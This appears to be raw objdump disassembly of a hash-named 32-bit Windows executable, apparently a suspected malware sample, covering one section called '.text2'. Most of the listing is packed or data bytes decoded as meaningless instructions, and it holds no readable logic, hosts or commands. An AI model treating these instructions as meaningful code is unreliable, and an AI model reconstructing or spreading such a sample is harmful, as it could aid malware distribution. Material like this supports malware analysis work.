
7739b40a226d623e94c641e2f1fcdaad9b4c8070ecbbe21c4af9d713c2283210.exe:     file format pei-i386


Disassembly of section .text2:

00401000 <.text2>:
  401000:	inc    eax
  401001:	push   edx
  401002:	inc    edx
  401003:	add    BYTE PTR [edx+edx*2+0x42],al
  401007:	add    BYTE PTR [eax+0x52],cl
  40100a:	inc    edx
  40100b:	add    BYTE PTR [edx+edx*2+0x42],cl
  40100f:	add    BYTE PTR [eax+0x52],dl
  401012:	inc    edx
  401013:	add    BYTE PTR [edx+edx*2+0x42],dl
  401017:	add    BYTE PTR [eax+0x52],bl
  40101a:	inc    edx
  40101b:	add    BYTE PTR [edx+edx*2+0x42],bl
  40101f:	add    BYTE PTR [eax+0x52],ah
  401022:	inc    edx
  401023:	add    BYTE PTR [edx+edx*2+0x42],ah
  401027:	add    BYTE PTR [eax+0x52],ch
  40102a:	inc    edx
  40102b:	add    BYTE PTR [edx+edx*2+0x42],ch
  40102f:	add    BYTE PTR [eax+0x52],dh
  401032:	inc    edx
  401033:	add    BYTE PTR [edx+edx*2+0x42],dh
  401037:	add    BYTE PTR [eax+0x52],bh
  40103a:	inc    edx
  40103b:	add    BYTE PTR [edx+edx*2+0x42],bh
  40103f:	add    BYTE PTR [eax-0x7bffbdae],al
  401045:	push   edx
  401046:	inc    edx
  401047:	add    BYTE PTR [eax-0x73ffbdae],cl
  40104d:	push   edx
  40104e:	inc    edx
  40104f:	add    BYTE PTR [eax-0x6bffbdae],dl
  401055:	push   edx
  401056:	inc    edx
  401057:	add    BYTE PTR [eax-0x63ffbdae],bl
  40105d:	push   edx
  40105e:	inc    edx
  40105f:	add    BYTE PTR [eax-0x5bffbdae],ah
  401065:	push   edx
  401066:	inc    edx
  401067:	add    BYTE PTR [eax-0x53ffbdae],ch
  40106d:	push   edx
  40106e:	inc    edx
  40106f:	add    BYTE PTR [eax-0x4bffbdae],dh
  401075:	push   edx
  401076:	inc    edx
  401077:	add    BYTE PTR [eax-0x43ffbdae],bh
  40107d:	push   edx
  40107e:	inc    edx
  40107f:	add    BYTE PTR [eax+0x53],ah
  401082:	inc    edx
  401083:	add    BYTE PTR [ebx+edx*2+0x42],ah
  401087:	add    BYTE PTR [eax+0x53],ch
  40108a:	inc    edx
  40108b:	add    BYTE PTR [ebx+edx*2+0x42],ch
  40108f:	add    BYTE PTR [eax+0x53],dh
  401092:	inc    edx
  401093:	add    BYTE PTR [ebx+edx*2+0x42],dh
  401097:	add    BYTE PTR [eax+0x53],bh
  40109a:	inc    edx
  40109b:	add    BYTE PTR [ebx+edx*2+0x42],bh
  40109f:	add    BYTE PTR [ebx+edx*2+0x52fc0042],al
  4010a6:	inc    edx
  4010a7:	add    BYTE PTR [eax],al
  4010a9:	push   ebx
  4010aa:	inc    edx
  4010ab:	add    BYTE PTR [ebx+edx*2],al
  4010ae:	inc    edx
  4010af:	add    BYTE PTR [eax],cl
  4010b1:	push   ebx
  4010b2:	inc    edx
  4010b3:	add    BYTE PTR [ebx+edx*2],cl
  4010b6:	inc    edx
  4010b7:	add    BYTE PTR [eax],dl
  4010b9:	push   ebx
  4010ba:	inc    edx
  4010bb:	add    BYTE PTR [ebx+edx*2],dl
  4010be:	inc    edx
  4010bf:	add    BYTE PTR [eax],bl
  4010c1:	push   ebx
  4010c2:	inc    edx
  4010c3:	add    BYTE PTR [ebx+edx*2],bl
  4010c6:	inc    edx
  4010c7:	add    BYTE PTR [eax],ah
  4010c9:	push   ebx
  4010ca:	inc    edx
  4010cb:	add    BYTE PTR [ebx+edx*2],ah
  4010ce:	inc    edx
  4010cf:	add    BYTE PTR [eax],ch
  4010d1:	push   ebx
  4010d2:	inc    edx
  4010d3:	add    BYTE PTR [ebx+edx*2],ch
  4010d6:	inc    edx
  4010d7:	add    BYTE PTR [eax],dh
  4010d9:	push   ebx
  4010da:	inc    edx
  4010db:	add    BYTE PTR [ebx+edx*2],dh
  4010de:	inc    edx
  4010df:	add    BYTE PTR [eax],bh
  4010e1:	push   ebx
  4010e2:	inc    edx
  4010e3:	add    BYTE PTR [ebx+edx*2],bh
  4010e6:	inc    edx
  4010e7:	add    BYTE PTR [eax+0x53],al
  4010ea:	inc    edx
  4010eb:	add    BYTE PTR [ebx+edx*2+0x42],al
  4010ef:	add    BYTE PTR [eax+0x53],cl
  4010f2:	inc    edx
  4010f3:	add    BYTE PTR [ebx+edx*2+0x42],cl
  4010f7:	add    BYTE PTR [ebx+edx*2+0x42],dl
  4010fb:	add    ah,dh
  4010fd:	push   edx
  4010fe:	inc    edx
  4010ff:	add    ah,dl
  401101:	push   edx
  401102:	inc    edx
  401103:	add    al,bl
  401105:	push   edx
  401106:	inc    edx
  401107:	add    ah,bl
  401109:	push   edx
  40110a:	inc    edx
  40110b:	add    al,ah
  40110d:	push   edx
  40110e:	inc    edx
  40110f:	add    ah,ah
  401111:	push   edx
  401112:	inc    edx
  401113:	add    al,ch
  401115:	push   edx
  401116:	inc    edx
  401117:	add    BYTE PTR [eax],al
  401119:	add    al,BYTE PTR [eax]
  40111b:	add    BYTE PTR [ebx+ebx*2],bl
  40111e:	add    BYTE PTR [eax],al
  401120:	xor    al,0x5b
  401122:	add    BYTE PTR [eax],al
  401124:	mov    al,ds:0xb0329069
  401129:	imul   ebx,DWORD PTR [eax-0x5f965fce],0xa8698032
  401133:	xor    bl,BYTE PTR [ebx+edi*1]
  401136:	add    DWORD PTR [eax],eax
  401138:	clc    
  401139:	pop    edx
  40113a:	add    BYTE PTR [eax],al
  40113c:	pcmpgtd mm7,QWORD PTR [ebx+0x3d]
  401140:	pushf  
  401141:	data16 mov bh,BYTE PTR ds:0x3d9866a3
  401148:	stos   BYTE PTR es:[edi],al
  401149:	retw   
  40114b:	cmp    eax,0x3dd86652
  401150:	jo     0x4011b8
  401152:	sbb    eax,0x4165373e
  401157:	ds aad 0x64
  40115a:	int    0x3e
  40115c:	dec    eax
  40115d:	add    BYTE PTR fs:[eax],al
  401160:	sbb    al,0x2b
  401162:	add    DWORD PTR [eax],eax
  401164:	mov    BYTE PTR [ebx+0x0],bl
  401167:	add    BYTE PTR [ebx+0x5930bd6b],dl
  40116d:	imul   esi,esp,0x30
  401170:	cmp    DWORD PTR [ebx+0x17],ebp
  401173:	xor    DWORD PTR ds:0x7231f76a,ebp
  401179:	imul   edi,DWORD PTR [ebx-0x2996aece],0x32
	...
  4011a7:	add    BYTE PTR [eax],al
  4011a9:	cld    
  4011aa:	push   0x682832fd
  4011af:	sbb    dh,BYTE PTR [ebx]
  4011b1:	dec    esi
  4011b2:	push   0x679d3355
  4011b7:	mov    DWORD PTR [ebx],esi
  4011b9:	stos   DWORD PTR es:[edi],eax
  4011ba:	addr16 xchg esi,eax
  4011bc:	xor    eax,eax
  4011be:	addr16 mov ch,0x33
  4011c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011c2:	addr16 ret 
  4011c4:	xor    edx,esi
  4011c6:	shl    DWORD PTR [bp+di],1
  4011c9:	sti    
  4011ca:	addr16 out dx,eax
  4011cc:	xor    ecx,ecx
  4011ce:	addr16 pop es
  4011d0:	xor    al,0x2d
  4011d2:	outs   dx,DWORD PTR ds:[esi]
  4011d3:	sbb    esi,DWORD PTR [esi*8+0x5d34336e]
  4011da:	outs   dx,DWORD PTR ds:[esi]
  4011db:	js     0x401211
  4011dd:	xor    ch,BYTE PTR [edi-0x7c]
  4011e0:	xor    al,0x91
  4011e2:	outs   dx,BYTE PTR ds:[esi]
  4011e3:	call   0x9434:0xee6e6e34
  4011ea:	outs   dx,BYTE PTR ds:[esi]
  4011eb:	add    eax,0x1b6e2d35
  4011f0:	xor    eax,0x352e6e40
  4011f5:	inc    ebp
  4011f6:	outs   dx,BYTE PTR ds:[esi]
  4011f7:	ds xor eax,0x354d6de0
  4011fd:	shr    DWORD PTR [ebp+0x64],cl
  401200:	xor    eax,0x356f6df6
  401205:	jmp    0xda758b77
  40120a:	ins    DWORD PTR es:[edi],dx
  40120b:	test   BYTE PTR ds:0x0,dh
	...
  401235:	add    BYTE PTR [esi-0x56ca6793],ch
  40123b:	ins    DWORD PTR es:[edi],dx
  40123c:	mov    ds:0xca6d8335,al
  401241:	xor    eax,0x35fc6d32
  401246:	push   ds
  401247:	ins    DWORD PTR es:[edi],dx
  401248:	or     al,0x36
  40124a:	repnz ins BYTE PTR es:[edi],dx
  40124c:	pop    ebx
  40124d:	ss mov ah,0x6c
  401250:	jl     0x401288
  401252:	mov    ds:0xb5369369,al
  401257:	imul   esp,DWORD PTR [ecx-0x4b964aca],0xd169d436
  401261:	ss aad 0x69
  401264:	call   0x9b2e9f
  401269:	add    BYTE PTR [ebx+ebx*2],bl
  40126c:	add    BYTE PTR [eax],al
  40126e:	sbb    al,0x5b
  401270:	add    BYTE PTR [eax],al
  401272:	sbb    al,0x5b
  401274:	add    BYTE PTR [eax],al
  401276:	sbb    al,0x5b
  401278:	add    BYTE PTR [eax],al
  40127a:	sbb    al,0x5b
  40127c:	add    BYTE PTR [eax],al
  40127e:	sbb    al,0x5b
  401280:	add    BYTE PTR [eax],al
  401282:	sbb    al,0x5b
  401284:	add    BYTE PTR [eax],al
  401286:	sbb    al,0x5b
  401288:	add    BYTE PTR [eax],al
  40128a:	sbb    al,0x5b
  40128c:	add    BYTE PTR [eax],al
  40128e:	sbb    al,0x5b
  401290:	add    BYTE PTR [eax],al
  401292:	sbb    al,0x5b
  401294:	add    BYTE PTR [eax],al
  401296:	sbb    al,0x5b
	...
  4012c0:	add    BYTE PTR [eax],al
  4012c2:	add    BYTE PTR [ebx+ebx*2],bl
  4012c5:	add    BYTE PTR [eax],al
  4012c7:	sbb    al,0x5b
  4012c9:	add    BYTE PTR [eax],al
  4012cb:	sbb    al,0x5b
  4012cd:	add    BYTE PTR [eax],al
  4012cf:	sbb    al,0x5b
  4012d1:	add    BYTE PTR [eax],al
  4012d3:	sbb    al,0x5b
  4012d5:	add    BYTE PTR [eax],al
  4012d7:	sbb    al,0x5b
  4012d9:	add    BYTE PTR [eax],al
  4012db:	sbb    al,0x5b
  4012dd:	add    BYTE PTR [eax],al
  4012df:	sbb    al,0x5b
  4012e1:	add    BYTE PTR [eax],al
  4012e3:	sbb    al,0x5b
  4012e5:	add    BYTE PTR [eax],al
  4012e7:	sbb    al,0x5b
  4012e9:	add    BYTE PTR [eax],al
  4012eb:	sbb    al,0x5b
  4012ed:	add    BYTE PTR [eax],al
  4012ef:	sbb    al,0x5b
  4012f1:	add    BYTE PTR [eax],al
  4012f3:	sbb    al,0x5b
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	sbb    al,0x5b
  4012f9:	add    BYTE PTR [eax],al
  4012fb:	sbb    al,0x5b
  4012fd:	add    BYTE PTR [eax],al
  4012ff:	sbb    al,0x5b
  401301:	add    BYTE PTR [eax],al
  401303:	sbb    al,0x5b
  401305:	add    BYTE PTR [eax],al
  401307:	sbb    al,0x5b
  401309:	add    BYTE PTR [eax],al
  40130b:	sbb    al,0x5b
  40130d:	add    BYTE PTR [eax],al
  40130f:	sbb    al,0x5b
  401311:	add    BYTE PTR [eax],al
  401313:	sbb    al,0x5b
  401315:	add    BYTE PTR [eax],al
  401317:	sbb    al,0x5b
  401319:	add    BYTE PTR [eax],al
  40131b:	sbb    al,0x5b
  40131d:	add    BYTE PTR [eax],al
  40131f:	sbb    al,0x5b
  401321:	add    BYTE PTR [eax],al
  401323:	sbb    al,0x5b
	...
  40134d:	add    BYTE PTR [eax],al
  40134f:	add    BYTE PTR [ebx+ebx*2],bl
  401352:	add    BYTE PTR [eax],al
  401354:	sbb    al,0x5b
  401356:	add    BYTE PTR [eax],al
  401358:	sbb    al,0x5b
  40135a:	add    BYTE PTR [eax],al
  40135c:	sbb    al,0x5b
  40135e:	add    BYTE PTR [eax],al
  401360:	sbb    al,0x5b
  401362:	add    BYTE PTR [eax],al
  401364:	sbb    al,0x5b
  401366:	add    BYTE PTR [eax],al
  401368:	sbb    al,0x5b
  40136a:	add    BYTE PTR [eax],al
  40136c:	sbb    al,0x5b
  40136e:	add    BYTE PTR [eax],al
  401370:	sbb    al,0x5b
  401372:	add    BYTE PTR [eax],al
  401374:	sbb    al,0x5b
  401376:	add    BYTE PTR [eax],al
  401378:	sbb    al,0x5b
  40137a:	add    BYTE PTR [eax],al
  40137c:	sbb    al,0x5b
  40137e:	add    BYTE PTR [eax],al
  401380:	sbb    al,0x5b
  401382:	add    BYTE PTR [eax],al
  401384:	sbb    al,0x5b
  401386:	add    BYTE PTR [eax],al
  401388:	sbb    al,0x5b
  40138a:	add    BYTE PTR [eax],al
  40138c:	sbb    al,0x5b
  40138e:	add    BYTE PTR [eax],al
  401390:	sbb    al,0x5b
  401392:	add    BYTE PTR [eax],al
  401394:	sbb    al,0x5b
  401396:	add    BYTE PTR [eax],al
  401398:	sbb    al,0x5b
  40139a:	add    BYTE PTR [eax],al
  40139c:	sbb    al,0x5b
  40139e:	add    BYTE PTR [eax],al
  4013a0:	sbb    al,0x5b
  4013a2:	add    BYTE PTR [eax],al
  4013a4:	sbb    al,0x5b
  4013a6:	add    BYTE PTR [eax],al
  4013a8:	sbb    al,0x5b
  4013aa:	add    BYTE PTR [eax],al
  4013ac:	sbb    al,0x5b
  4013ae:	add    BYTE PTR [eax],al
  4013b0:	sbb    al,0x5b
	...
  4013da:	add    BYTE PTR [eax],al
  4013dc:	add    BYTE PTR [ebx+ebx*2],bl
  4013df:	add    BYTE PTR [eax],al
  4013e1:	sbb    al,0x5b
  4013e3:	add    BYTE PTR [eax],al
  4013e5:	sbb    al,0x5b
  4013e7:	add    BYTE PTR [eax],al
  4013e9:	add    BYTE PTR [esi+0x1],dh
  4013ec:	add    BYTE PTR [ebx+eiz*1],bl
  4013ef:	inc    ecx
  4013f0:	add    BYTE PTR [ebx+0x3e],ah
  4013f3:	je     0x401445
  4013f5:	dec    esi
  4013f6:	xor    al,0x63
  4013f8:	inc    ecx
  4013f9:	inc    eax
  4013fa:	aas    
  4013fb:	jb     0x401462
  4013fd:	dec    edi
  4013fe:	sub    BYTE PTR [eax],al
  401400:	add    BYTE PTR [eax+0x34],ch
  401403:	popa   
  401404:	fs pusha 
  401406:	xor    ah,BYTE PTR [edx+0x72]
  401409:	cmp    eax,0x24457929
  40140e:	sbb    al,BYTE PTR [eax]
  401410:	add    al,ch
  401412:	xor    esp,DWORD PTR [ecx+0x64]
  401415:	loopne 0x401448
  401417:	bound  esi,QWORD PTR [edx-0x3]
  40141a:	sub    BYTE PTR [ecx+0x45],bh
  40141d:	add    al,0xc
  40141f:	add    BYTE PTR [eax],al
  401421:	jecxz  0x401460
  401423:	je     0x401472
  401425:	add    edi,DWORD PTR [edi]
  401427:	jne    0x401495
  401429:	add    DWORD PTR [ebx],edx
  40142b:	popa   
  40142c:	outs   dx,BYTE PTR ds:[esi]
  40142d:	clc    
  40142e:	ss gs inc ecx
  401431:	sbb    al,0x5b
  401433:	add    BYTE PTR [eax],al
  401435:	fild   QWORD PTR [eax]
  401437:	gs popa 
  401439:	sar    BYTE PTR ds:0x3db06946,1
  40143f:	inc    ecx
  401440:	add    al,cl
  401442:	daa    
  401443:	je     0x4014b7
  401445:	mov    edi,0x1c417439
  40144a:	pop    ebx
  40144b:	add    BYTE PTR [eax],al
  40144d:	fstp   TBYTE PTR ds:0x5774
	...
  401477:	add    BYTE PTR [eax],al
  401479:	add    BYTE PTR [ebp-0x74909bcb],al
  40147f:	sub    BYTE PTR [ecx+ebp*2-0x72],al
  401483:	arpl   WORD PTR ds:[ebx+esi*2+0x29],si
  401488:	jns    0x4014cb
  40148a:	sbb    al,0x5b
  40148c:	add    BYTE PTR [eax],al
  40148e:	pop    ebx
  40148f:	ds je  0x4014df
  401492:	jnp    0x4014d3
  401494:	jne    0x401502
  401496:	jns    0x4014ab
  401498:	popa   
  401499:	outs   dx,BYTE PTR ds:[esi]
  40149a:	inc    eax
  40149b:	aaa    
  40149c:	gs push edi
  40149e:	sbb    al,0x5b
  4014a0:	add    BYTE PTR [eax],al
  4014a2:	and    BYTE PTR [ecx+0x40],bl
  4014a5:	add    BYTE PTR [eax],ch
  4014a7:	pop    ecx
  4014a8:	inc    eax
  4014a9:	add    BYTE PTR [eax],al
  4014ab:	pop    ecx
  4014ac:	inc    eax
  4014ad:	add    al,ch
  4014af:	pop    eax
  4014b0:	inc    eax
  4014b1:	add    BYTE PTR [ecx+ebx*2+0x40],dl
  4014b5:	add    BYTE PTR [eax+0x59],cl
  4014b8:	inc    eax
  4014b9:	add    ah,bh
  4014bb:	pop    eax
  4014bc:	inc    eax
  4014bd:	add    BYTE PTR [ecx+ebx*2],dl
  4014c0:	inc    eax
  4014c1:	add    bl,ah
  4014c3:	cmp    eax,0x340e5074
  4014c8:	arpl   WORD PTR [ecx+0x0],ax
  4014cb:	aas    
  4014cc:	jb     0x401533
  4014ce:	out    dx,eax
  4014cf:	daa    
  4014d0:	add    BYTE PTR [eax],al
  4014d2:	fdiv   DWORD PTR [ebx]
  4014d4:	popa   
  4014d5:	shl    BYTE PTR fs:[ecx],1
  4014d8:	bound  esi,QWORD PTR [edx-0x43]
  4014db:	sub    BYTE PTR [ecx+0x45],bh
	...
  401506:	add    ah,dl
  401508:	sbb    DWORD PTR [eax],eax
  40150a:	add    BYTE PTR [edi-0x46918dc3],dh
  401510:	xor    esi,DWORD PTR ss:[edx]
  401513:	or     bh,BYTE PTR [edi]
  401515:	ins    BYTE PTR es:[edi],dx
  401516:	ins    BYTE PTR es:[edi],dx
  401517:	sbb    al,0x5b
  401519:	add    BYTE PTR [eax],al
  40151b:	mov    ecx,0xae637627
  401520:	cs cs mov BYTE PTR fs:[edi],ch
  401525:	add    BYTE PTR [eax],al
  401527:	cmp    DWORD PTR [eax],0x2781736d
  40152d:	add    BYTE PTR [eax],al
  40152f:	jno    0x40155f
  401531:	jbe    0x401596
  401533:	outs   dx,BYTE PTR ds:[esi]
  401534:	daa    
  401535:	cs sub BYTE PTR fs:[edi],0x0
  40153a:	add    BYTE PTR [ecx+0x38],bh
  40153d:	ins    DWORD PTR es:[edi],dx
  40153e:	arpl   WORD PTR [esp+0x0],bp
  401542:	add    BYTE PTR [edx+0x34],dh
  401545:	jb     0x4015bb
  401547:	dec    ecx
  401548:	cmp    al,0x6c
  40154a:	inc    ecx
  40154b:	cmp    BYTE PTR [edi],ch
  40154d:	outs   dx,DWORD PTR ds:[esi]
  40154e:	arpl   WORD PTR [ebx+ebx*2],bx
  401551:	add    BYTE PTR [eax],al
  401553:	push   ecx
  401554:	xor    DWORD PTR [ebp+0x61],ebp
  401557:	sub    al,0x9
  401559:	imul   esp,DWORD PTR [ebp+0x33],0x35466612
  401560:	das    
  401561:	gs add dl,dh
  401564:	xor    esi,DWORD PTR [edx+0x74]
  401567:	or     DWORD PTR [esp+ebp*2],edi
  40156a:	push   eax
	...
  401593:	add    BYTE PTR [esi],cl
  401595:	xor    dh,BYTE PTR [ebp+eiz*2-0x1]
  401599:	add    BYTE PTR es:[eax],al
  40159c:	in     al,0x37
  40159e:	popa   
  40159f:	jo     0x40157e
  4015a1:	cs ins BYTE PTR es:[edi],dx
  4015a3:	outs   dx,DWORD PTR ds:[esi]
  4015a4:	call   FWORD PTR [edx+0x0]
  4015a7:	add    bh,dh
  4015a9:	aaa    
  4015aa:	jb     0x40161a
  4015ac:	shr    DWORD PTR [esi],0x33
  4015af:	xor    al,BYTE PTR [edx]
  4015b1:	aaa    
  4015b2:	ins    BYTE PTR es:[edi],dx
  4015b3:	ins    BYTE PTR es:[edi],dx
  4015b4:	sbb    al,0x5b
  4015b6:	add    BYTE PTR [eax],al
  4015b8:	(bad)  [edi]
  4015ba:	je     0x40160c
  4015bc:	scas   al,BYTE PTR es:[edi]
  4015bd:	xor    DWORD PTR [ebx+0x65],esp
  4015c0:	scas   eax,DWORD PTR es:[edi]
  4015c1:	sub    eax,0x2abd6548
  4015c6:	add    BYTE PTR [eax],al
  4015c8:	sbb    al,0x5b
  4015ca:	add    WORD PTR [edi+esi*8],bx
  4015ce:	pop    ecx
  4015cf:	nop
  4015d0:	sbb    al,0xb5
  4015d2:	add    eax,DWORD PTR [eax]
  4015d4:	sbb    al,0xb0
  4015d6:	add    eax,DWORD PTR [eax]
  4015d8:	sbb    al,0xa1
  4015da:	sti    
  4015db:	add    BYTE PTR [esp+ebp*2],bl
  4015de:	add    eax,DWORD PTR [eax]
  4015e0:	sbb    al,0xb4
  4015e2:	add    eax,DWORD PTR [eax]
  4015e4:	sbb    al,0x74
  4015e6:	add    al,0x0
  4015e8:	sbb    al,0xb4
  4015ea:	add    eax,DWORD PTR [eax]
  4015ec:	sbb    al,0xb4
  4015ee:	add    eax,DWORD PTR [eax]
  4015f0:	sbb    al,0xb4
  4015f2:	add    eax,DWORD PTR [eax]
  4015f4:	sbb    al,0xb4
  4015f6:	add    eax,DWORD PTR [eax]
	...
  401620:	add    BYTE PTR [esp+esi*4],bl
  401623:	add    eax,DWORD PTR [eax]
  401625:	sbb    al,0xb4
  401627:	add    eax,DWORD PTR [eax]
  401629:	sbb    al,0xb4
  40162b:	add    eax,DWORD PTR [eax]
  40162d:	sbb    al,0xb4
  40162f:	add    eax,DWORD PTR [eax]
  401631:	sbb    al,0x34
  401633:	add    al,0x0
  401635:	sbb    al,0xba
  401637:	sbb    bh,BYTE PTR [edx+0x9afb422]
  40163d:	pop    ecx
  40163e:	xchg   edx,eax
  40163f:	mov    ebx,0x25eed001
  401644:	push   esp
  401645:	add    al,0x5b
  401647:	ja     0x401669
  401649:	in     al,dx
  40164a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40164b:	push   0x67
  40164d:	out    dx,al
  40164e:	xchg   edx,eax
  40164f:	push   0x6992ff20
  401654:	outs   dx,BYTE PTR ds:[esi]
  401655:	retf   
  401656:	jg     0x40167b
  401658:	bound  edi,QWORD PTR [ecx-0x458a89ad]
  40165e:	push   ebx
  40165f:	ins    DWORD PTR es:[edi],dx
  401660:	outs   dx,BYTE PTR ds:[esi]
  401661:	cld    
  401662:	test   DWORD PTR [edx+0x53],0x646a96fc
  401669:	mov    ecx,0x160d08a1
  40166e:	pop    ebx
  40166f:	int    0x3
  401671:	sbb    al,0x5b
  401673:	jmp    0xb99b327b
  401678:	inc    eax
  401679:	sbb    al,0x5b
  40167b:	popf   
  40167c:	add    al,0x1f
  40167e:	pop    ebx
  40167f:	xchg   BYTE PTR [edi+0x3e90bbf],ah
	...
  4016ad:	add    BYTE PTR [ebx+ebx*2],bl
  4016b0:	jmp    0x99b32b8
  4016b5:	add    al,0x1b
  4016b7:	pop    edx
  4016b8:	repnz add al,0x1e
  4016bb:	ins    DWORD PTR es:[edi],dx
  4016bc:	jmp    0xe99b33dc
  4016c1:	push   ebp
  4016c2:	sbb    al,0x5b
  4016c4:	jmp    0x109b32cc
  4016c9:	pop    es
  4016ca:	sbb    eax,0x1c13e95b
  4016cf:	pop    ebx
  4016d0:	jmp    0xe99b3408
  4016d5:	add    ebx,DWORD PTR [ebx+ebx*2-0x17]
  4016d9:	adc    ebx,DWORD PTR [ebx+ebx*2]
  4016dc:	jmp    0xed9b32e6
  4016e1:	add    ebx,DWORD PTR [ebx+ebx*2]
  4016e4:	jmp    0xed9b32ec
  4016e9:	add    ebx,DWORD PTR [ebx+ebx*2]
  4016ec:	jmp    0xe99b32f4
  4016f1:	xchg   ebx,eax
  4016f2:	sbb    eax,0x1c05e95b
  4016f7:	pop    ebx
  4016f8:	aaa    
  4016f9:	(bad)  
  4016fa:	sbb    eax,0x1c03eb5b
  4016ff:	pop    ebx
  401700:	jmp    0xe99b4308
  401705:	adc    ebx,DWORD PTR [ebx+ebx*2]
  401708:	jmp    0xe99b4310
  40170d:	adc    ebx,DWORD PTR [ebx+ebx*2]
  401710:	add    cl,ch
	...
  40173a:	add    BYTE PTR [edi],bl
  40173c:	pop    ebx
  40173d:	add    cl,bl
  40173f:	pop    ds
  401740:	pop    ebx
  401741:	add    cl,ch
  401743:	pop    ds
  401744:	pop    ebx
  401745:	add    cl,ch
  401747:	pop    ds
  401748:	pop    ebx
  401749:	add    ch,ch
  40174b:	xchg   esi,eax
  40174c:	pop    edx
  40174d:	add    BYTE PTR [ecx],ah
  40174f:	pop    ds
  401750:	pop    ebx
  401751:	add    cl,ch
  401753:	pop    ds
  401754:	pop    ebx
  401755:	add    cl,ch
  401757:	pop    ds
  401758:	pop    ebx
  401759:	add    cl,ch
  40175b:	pop    ds
  40175c:	pop    ebx
  40175d:	add    cl,ch
  40175f:	pop    ds
  401760:	pop    ebx
  401761:	add    cl,ch
  401763:	pop    ds
  401764:	pop    ebx
  401765:	add    cl,ch
  401767:	pop    ds
  401768:	pop    ebx
  401769:	add    cl,ch
  40176b:	pop    ds
  40176c:	pop    ebx
  40176d:	add    cl,ch
  40176f:	pop    ds
  401770:	pop    ebx
  401771:	add    cl,ch
  401773:	pop    ds
  401774:	pop    ebx
  401775:	add    cl,ch
  401777:	pop    ds
  401778:	pop    ebx
  401779:	add    cl,ch
  40177b:	pop    ds
  40177c:	pop    ebx
  40177d:	add    cl,ch
  40177f:	pop    ds
  401780:	pop    ebx
  401781:	add    cl,ch
  401783:	pop    ds
  401784:	pop    ebx
  401785:	add    cl,ch
  401787:	pop    ds
  401788:	pop    ebx
  401789:	add    cl,ch
  40178b:	pop    ds
  40178c:	pop    ebx
  40178d:	add    cl,ch
  40178f:	pop    ds
  401790:	pop    ebx
  401791:	add    cl,ch
  401793:	pop    ds
  401794:	pop    ebx
  401795:	add    cl,ch
  401797:	pop    ds
  401798:	pop    ebx
  401799:	add    cl,ch
  40179b:	pop    ds
  40179c:	pop    ebx
  40179d:	add    cl,ch
	...
  4017c7:	add    BYTE PTR [edi],bl
  4017c9:	pop    ebx
  4017ca:	add    ch,al
  4017cc:	sahf   
  4017cd:	pop    ecx
  4017ce:	add    BYTE PTR [ecx+0x1f],bh
  4017d1:	pop    ebx
  4017d2:	add    cl,ch
  4017d4:	pop    ds
  4017d5:	pop    ebx
  4017d6:	add    cl,ch
  4017d8:	pop    ds
  4017d9:	pop    ebx
  4017da:	add    BYTE PTR [eax],al
  4017dc:	xor    eax,0x4500005b
  4017e1:	pop    ebx
  4017e2:	add    BYTE PTR [eax],al
  4017e4:	inc    ebp
  4017e5:	pop    ebx
  4017e6:	add    BYTE PTR [eax],al
  4017e8:	xor    eax,0x4b00005b
  4017ed:	das    
  4017ee:	gs js  0x4017a2
  4017f1:	pop    edx
  4017f2:	add    BYTE PTR [eax],al
  4017f4:	mov    esi,0xf500014b
  4017f9:	dec    edx
  4017fa:	add    BYTE PTR [eax],al
  4017fc:	cmc    
  4017fd:	inc    edx
  4017fe:	add    DWORD PTR [eax],eax
  401800:	add    eax,0x5000059
  401805:	pop    ebx
  401806:	add    BYTE PTR [eax],al
  401808:	cmc    
  401809:	pop    edx
  40180a:	add    BYTE PTR [eax],al
  40180c:	cmc    
  40180d:	pop    edx
  40180e:	add    BYTE PTR [eax],al
  401810:	and    eax,0x1b600057
  401815:	and    eax,0x3a716164
  40181a:	add    BYTE PTR [eax],al
  40181c:	mov    ch,0x59
  40181e:	add    BYTE PTR [eax],al
  401820:	lds    ebp,FWORD PTR [edx+0x1]
  401823:	add    ch,al
  401825:	pop    eax
  401826:	add    BYTE PTR [eax],al
  401828:	mov    ch,0x40
  40182a:	add    DWORD PTR [eax],eax
	...
  401854:	add    BYTE PTR [ebp-0x7affffa6],dh
  40185a:	pop    edx
  40185b:	add    BYTE PTR [eax],al
  40185d:	test   DWORD PTR [edx+0x0],ebx
  401860:	add    BYTE PTR ds:0x6b400057,dh
  401866:	(bad)  
  401867:	pusha  
  401868:	je     0x40188e
  40186a:	push   edi
  40186b:	add    BYTE PTR [eax],al
  40186d:	sub    eax,0x75000014
  401872:	sbb    al,BYTE PTR [ecx]
  401874:	add    BYTE PTR [ebp+0x10],dh
  401877:	add    BYTE PTR [eax],al
  401879:	inc    ebp
  40187a:	inc    esi
  40187b:	add    DWORD PTR [eax],eax
  40187d:	sbb    al,0xb4
  40187f:	add    eax,DWORD PTR [eax]
  401881:	sbb    al,0xb4
  401883:	add    eax,DWORD PTR [eax]
  401885:	sbb    al,0xb4
  401887:	add    eax,DWORD PTR [eax]
  401889:	sbb    al,0xf4
  40188b:	add    eax,DWORD PTR [eax]
  40188d:	pop    esp
  40188e:	mov    ah,0x3
  401890:	add    BYTE PTR [esp+esi*4],bl
  401893:	add    eax,DWORD PTR [eax]
  401895:	sbb    al,0xb4
  401897:	add    eax,DWORD PTR [eax]
  401899:	sbb    al,0xb4
  40189b:	add    eax,DWORD PTR [eax]
  40189d:	sbb    al,0xdf
  40189f:	mov    esp,gs
  4018a1:	ins    BYTE PTR es:[edi],dx
  4018a2:	in     al,dx
  4018a3:	imul   ecx,DWORD PTR [edi],0x2c
  4018a6:	hlt    
  4018a7:	add    edi,eax
  4018a9:	outs   dx,BYTE PTR ds:[esi]
  4018aa:	mov    bl,0xc4
  4018ac:	push   ebx
  4018ae:	push   ds
  4018af:	or     ebp,DWORD PTR [edx+0x1d]
  4018b2:	fiadd  DWORD PTR [ebx]
  4018b4:	call   0x449920
	...
  4018e1:	add    ch,ah
  4018e3:	icebp  
  4018e4:	add    BYTE PTR [eax],al
  4018e6:	imul   edi,DWORD PTR [ecx],0x1c6450e8
  4018ec:	adc    BYTE PTR es:[esp+esi*4-0x5],bl
  4018f1:	jb     0x401910
  4018f3:	icebp  
  4018f4:	test   DWORD PTR [ebx+0x7403bc31],0x8513917
  4018fe:	xchg   edi,eax
  4018ff:	mov    eax,ds:0xbd2475f6
  401904:	push   edx
  401905:	or     BYTE PTR [ebp-0xf],ah
  401908:	add    BYTE PTR [eax],al
